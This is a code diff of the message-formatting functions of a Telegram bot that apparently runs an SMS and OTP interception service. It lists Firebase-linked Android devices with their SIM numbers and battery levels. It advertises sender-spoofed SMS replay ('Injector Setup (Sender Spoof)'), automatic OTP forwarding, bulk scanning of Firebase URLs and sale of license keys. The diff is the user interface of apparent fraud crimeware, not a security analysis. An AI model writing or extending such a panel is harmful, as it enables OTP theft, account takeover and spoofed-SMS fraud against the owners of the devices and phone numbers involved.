@@ -14,14 +14,13 @@ def format_addchannel_card(channel_id: str, sim_slot: int = 1) -> str:
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
-        "Channel Connected!\n\n"
-        f"📢 Channel: {channel_id}\n"
+        f"Channel set (only this one monitored):\n"
+        f"{channel_id}\n\n"
+        "Make sure I am an ADMIN there!\n\n"
         f"📶 Selected SIM: SIM {sim_slot}\n"
-        "📬 Channel par To: + Message: aaye\n"
-        "   → us number par auto SMS send hoga\n"
-        "   selected SIM se"
+        "Channel par SMS/OTP aaye → auto forward"
         "</pre>\n\n"
-        "Next Step: /startmonitor"
+        "Next: <code>/startmonitor</code>"
     )
 
 
@@ -101,25 +100,33 @@ def get_model_name(device: Device) -> str:
     return meta.get("model") or meta.get("device_model") or "Unknown"
 
 
-def format_device_set_card(device: Device, selected_sim: int = 0) -> str:
+def format_device_set_card(
+    device: Device,
+    selected_sim: int = 0,
+    *,
+    found_ms: int | None = None,
+    status: str = "online",
+) -> str:
     sims = get_sim_list(device)
     active = sims[selected_sim] if sims else {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}
     device_short = short_device_id(device.name)
-
-    sim_lines = "\n".join(
-        f"SIM {sim['slot']}: {sim['carrier']} ({sim['number']})" for sim in sims
-    )
+    db_url = device.firebase_source_url or "Not linked"
+    timing = f"\nFound in {found_ms}ms" if found_ms is not None else ""
+    status_icon = "🟢" if status == "online" else "🟡"
 
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
-        "Device Set!\n\n"
-        f"📱 Device: {device_short}\n"
+        "Device Found &amp; Set!\n\n"
+        f"📱 ID: {device_short}\n"
+        f"📦 Model: {get_model_name(device)}\n"
         f"🔋 Battery: {get_battery(device)}\n"
-        f"📶 Active SIM: SIM {active['slot']} (Index {active['index']})\n"
-        f"📞 FROM Number: {active['number']}\n\n"
-        f"{sim_lines}\n\n"
-        "Select SIM Slot for sending SMS:"
+        f"{status_icon} Status: {status.title()}\n"
+        f"🔥 DB: {db_url}"
+        f"{timing}\n\n"
+        "⚠️ Previous monitoring was AUTO-STOPPED.\n"
+        "Use /startmonitor again when ready.\n\n"
+        "Select SIM to send FROM:"
         "</pre>"
     )
 
@@ -128,12 +135,15 @@ def device_set_keyboard(device: Device) -> InlineKeyboardMarkup:
     sims = get_sim_list(device)
     sim_buttons = [
         InlineKeyboardButton(
-            f"📶 SIM {sim['slot']}: {sim['carrier']} ({sim['number'][:6]}...)",
+            f"📶 SIM {sim['slot']}",
             callback_data=f"sim:{device.id}:{sim['index']}",
         )
         for sim in sims[:2]
     ]
-    rows = [sim_buttons] if sim_buttons else []
+    rows = []
+    if sim_buttons:
+        rows.append(sim_buttons)
+    rows.append([InlineKeyboardButton("📋 COPY CODE", callback_data=f"copy:{device.name}")])
     rows.append([InlineKeyboardButton("🔴 STOP", callback_data=f"stop:{device.id}")])
     return InlineKeyboardMarkup(rows)
 
@@ -272,20 +282,17 @@ def monitoring_keyboard() -> InlineKeyboardMarkup:
 
 def format_welcome_message() -> str:
     return (
-        "✨ <b>Welcome to Virtus SMS Automation</b>\n"
+        "✨ <b>Welcome to Premium Automation</b>\n"
         "Fast, secure, and reliable OTP forwarding\n"
         "directly to your Firebase connected devices.\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "💉 <b>Injector Setup (Sender Spoof)</b>\n"
         "<pre>"
-        "1. /setfirebase &lt;url&gt; → Firebase connect\n"
-        "   /allfirebase → .txt bulk scan\n"
-        "2. /key generate → license key (max 2 devices)\n"
-        "   /key KEY-XXXX-XXXX-XXXX → key set\n"
-        "3. /fdy &lt;device_id&gt; (bina key)\n"
-        "   /a &lt;device_id&gt; (key ke saath)\n"
+        "1. /key KEY-XXXX-XXXX-XXXX\n"
+        "   License key (inject)\n"
+        "2. /fy &lt;device_id&gt;\n"
         "   Pick device to monitor\n"
-        "4. Pick SIM → /addchannel → /startmonitor\n"
+        "3. Pick SIM → /addchannel → /startmonitor\n"
         "   Incoming SMS replayed with SAME sender ID"
         "</pre>\n\n"
         "🔥 <b>Admin Setup (Firebase Panel)</b>\n"
@@ -312,19 +319,19 @@ def format_welcome_message() -> str:
         "5. /startmonitor"
         "</pre>\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        "👥 <b>Admin</b>\n"
-        "<pre>"
-        "/approve &lt;telegram_id&gt;  → user ko access do\n"
-        "/revoke &lt;telegram_id&gt;   → access hatao\n"
-        "/users                    → approved list"
-        "</pre>\n\n"
         "🎮 <b>Controls</b>\n"
         "<pre>"
-        "/stop     Pause active monitor\n"
-        "/resume   Resume paused monitor\n"
-        "/status   Show current stats\n"
-        "/send     Manual SMS command\n"
+        "/stop     Pause monitor\n"
+        "/resume   Resume monitor\n"
+        "/status   View current stats\n"
+        "/send &lt;num&gt; &lt;msg&gt;  Manual SMS\n"
         "/ping     Check latency"
+        "</pre>\n\n"
+        "👥 <b>Extra (Virtus)</b>\n"
+        "<pre>"
+        "/key generate   → new license key\n"
+        "/approve &lt;id&gt;  → user access\n"
+        "/allfirebase    → bulk txt scan"
         "</pre>"
     )
 
